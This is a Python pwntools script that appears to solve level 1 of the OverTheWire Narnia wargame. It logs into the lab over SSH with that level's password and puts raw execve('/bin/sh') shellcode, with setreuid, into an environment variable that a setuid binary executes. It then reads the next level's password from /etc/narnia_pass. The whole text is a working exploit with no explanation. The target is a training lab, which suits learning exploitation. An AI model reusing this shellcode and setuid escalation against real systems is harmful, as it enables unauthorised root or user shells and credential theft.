from pwn import *

context(arch='i386', os='linux')
s = ssh(user='narnia1', host='narnia.labs.overthewire.org', password='efeidiedae', port=2226)

# Get a simple shellcode
# shellcode crafted from shellcraft
shellcode = asm(shellcraft.sh())
# shellcode crafted from other sources
shellcode2 = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"

log.info("Running the binary")
sh = s.run('\
                export EGG="'+shellcode2+'";\
                /narnia/narnia1')
print(sh.recvline())
log.info("Sensing whoami")
sh.sendline('whoami')
print(sh.recvline())
log.info("Asking for the password")
sh.sendline('cat /etc/narnia_pass/narnia2')
# print(sh.recvline())
log.info('Flag: '+sh.recvline().split('\n')[0])
s.close()
